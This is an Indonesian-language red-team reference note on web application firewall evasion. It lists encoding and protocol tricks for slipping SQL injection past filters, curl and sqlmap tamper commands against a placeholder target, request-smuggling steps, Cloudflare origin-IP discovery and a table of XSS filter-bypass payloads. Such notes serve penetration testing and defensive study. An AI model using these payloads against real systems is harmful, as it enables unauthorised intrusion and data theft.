---
title: Attack Perspective — WAF Evasion (Red Team)
tags:
- attack
- red-team
- waf
- evasion
- encoding
- sqli
- xss
- tamper
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---

# WAF Evasion — Perspektif Penyerang

> WAF = signature-based filter. Bypass: encoding chain, header manipulation, protocol mismatch, oversize, chunked, origin IP discovery, HTTP desync.

## 1. WAF Bypass Matrix

| Teknik | Konkret | Contoh | Efektif Melawan |
|--------|---------|--------|-----------------|
| **URL Encoding** | Encode payload | `' OR 1=1--` → `%27%20OR%201%3D1--` | Signature regex |
| **Double Encoding** | Encode dua kali | `%2527` → backend decode → `%27` → `'` | Single-decode WAF |
| **Hex Encoding** | MySQL hex literal | `0x27` = `'` | Signature regex |
| **Unicode** | Unicode escape | `\u0027` (JSON) | ASCII regex |
| **Inline Comment** | MySQL comment | `/**/OR/**/1=1` | Regex whitespace |
| **Newline/Tab** | Break regex line | `%0a`, `%09` | Regex line-based |
| **Case Variation** | Mixed case | `UnIoN SeLeCt` | Case-sensitive regex |
| **Versioned Comment** | MySQL only | `/*!50000UNION*/` | Generic regex |
| **HPP** | HTTP Parameter Pollution | `?id=1&id=' OR 1=1--` | Single-param WAF |
| **Chunked TEC** | Transfer-Encoding chunked | TE: chunked → split payload | Content-Length WAF |
| **HTTP Desync** | Request smuggling | CL.TE / TE.CL mismatch | Proxy-chain WAF |
| **Oversize** | Payload > WAF buffer | 10MB POST → WAF skip | Size-limited WAF |

## 2. SQLi WAF Bypass Chain

```
Identify WAF: wafw00f, response header, error page
    ↓
Test Encoding Bypass:
  ├── curl 'http://target/?id=1%27%20OR%201%3D1--'
  ├── curl 'http://target/?id=1/**/OR/**/1=1--'
  ├── curl 'http://target/?id=1%0aOR%0a1=1--'
  └→ Observe: response berbeda → WAF vs backend
    ↓
If Signature WAF:
  ├── sqlmap --tamper=space2comment --tamper=between
  ├── sqlmap --tamper=versionedkeywords (MySQL)
  └→ Automated bypass chain
    ↓
If Proxy-Chain WAF:
  ├── CL.TE: send CL=100 + TE=chunked → smuggle
  ├── TE.CL: TE=chunked + CL=100 → smuggle
  └→ Backend process request WAF tidak lihat
    ↓
If CDN WAF (Cloudflare):
  ├── Origin IP discovery (SecurityTrails DNS history)
  ├── Direct request ke origin → bypass WAF
  └→ Subdomain enum → unprotected endpoint
```

## 3. XSS WAF Bypass

| Teknik | Contoh | Notes |
|--------|--------|-------|
| SVG onload | `<svg onload=alert(1)>` | Bypass script-tag filter |
| Image onerror | `<img src=x onerror=alert(1)>` | Bypass script filter |
| Details open | `<details open ontoggle=alert(1)>` | Event handler bypass |
| Iframe srcdoc | `<iframe srcdoc="<script>alert(1)</script>">` | Nested bypass |
| Unicode escape | `\u003cscript\u003e` | JSON context |
| HTML entity | `&lt;script&gt;` | Decode-before-filter miss |
| Mutation XSS | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` | Parser confusion |
| Template literal | `` `${alert(1)}` `` | JS template bypass |

## 4. Tool Stack

| Tool | Use |
|------|-----|
| **wafw00f** | WAF fingerprint |
| **sqlmap --tamper** | Automated SQLi bypass |
| **Burp Suite** | Manual encoding + desync testing |
| **CloudFlair** | Cloudflare origin IP discovery |
| **ffuf** | Endpoint fuzz → WAF rule discovery |
| **XSSor / XSStrike** | XSS payload generation |

## 5. Referensi
- wafw00f — https://github.com/EnableSecurity/wafw00f
- sqlmap tamper — https://github.com/sqlmapproject/sqlmap/tree/master/tamper
- PortSwigger Smuggling — https://portswigger.net/web-security/request-smuggling
- PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings